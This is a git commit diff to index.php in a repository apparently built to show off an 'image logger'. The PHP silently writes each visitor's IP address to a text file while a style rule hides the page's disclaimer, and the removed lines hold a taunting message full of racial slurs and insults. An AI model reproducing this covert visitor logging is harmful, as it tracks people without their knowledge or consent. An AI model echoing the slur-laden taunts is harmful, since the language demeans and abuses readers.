e745e14de8bef57627c22c3108c826632da6403b
NewAgent’s Demon <David2314001@proton.me>
2026-03-07 07:43:33 -0800

    Update index.php

--- Proof I Was The First Person To Make A Image Logger/Old Source Code/index.php
+++ Proof I Was The First Person To Make A Image Logger/Old Source Code/index.php
@@ -1,7 +1,6 @@
-Nigga Did You Really Think I Am That Dumb? BTW Thanks For Your IP Address Dumb Fuck XD
-
 <?php
-file_put_contents("DumbAssNiggasIPAddressThatWantedToBeNosyXD.txt", "IP: " . $_SERVER['REMOTE_ADDR'] . "\nHostname: " . gethostname() . "\nClient Name: " . php_uname('n') . "\n===============\n",FILE_APPEND);
+file_put_contents("PeopleThatWantedToBeNosyXD.txt", "IP: " . $_SERVER['REMOTE_ADDR'] . "\nHostname: " . gethostname() . "\nClient Name: " . php_uname('n') . "\n===============\n",FILE_APPEND);
 ?>          <style>
 .disclaimer { display: none; }
+
 </style>
